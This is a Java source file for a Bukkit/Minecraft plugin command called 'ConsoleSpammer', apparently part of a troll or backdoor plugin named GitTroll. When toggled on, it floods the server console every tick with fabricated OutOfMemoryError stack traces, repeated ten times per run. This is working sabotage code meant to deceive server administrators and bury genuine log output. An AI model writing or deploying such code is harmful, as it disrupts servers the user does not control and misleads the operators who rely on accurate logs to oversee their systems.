package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.scheduler.BukkitTask;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class ConsoleSpammer extends CommandBase implements Runnable {

	private BukkitTask spammerTask = null;
	
	public ConsoleSpammer() {
		super("ConsoleSpammer", "Spam the server console with errors");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			if(spammerTask == null) {
				this.spammerTask = Bukkit.getScheduler().runTaskTimerAsynchronously(GitTroll.getInstance().getParentPlugin(), this, 0, 1);
				executor.sendGitMessage("The console now gets spammed with errors.");
			} else {
				this.spammerTask.cancel();
				this.spammerTask = null;
				executor.sendGitMessage("§cThe console spammer has been disabled.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

	@Override
	public void run() {
		for(int i = 0; i < 10; i++) {
			System.err.println("java.lang.OutOfMemoryError\r\n" + 
					"        at net.minecraft.server.v1_8_R3.MinecraftServer.B(MinecraftServer.java:723)\r\n" + 
					"        at net.minecraft.server.v1_8_R3.DedicatedServer.B(DedicatedServer.java:374)\r\n" + 
					"        at net.minecraft.server.v1_8_R3.MinecraftServer.A(MinecraftServer.java:654)\r\n" + 
					"        at net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java:557)\r\n" + 
					"        at java.lang.Thread.run(Unknown Source)");
		}
	}
	
}
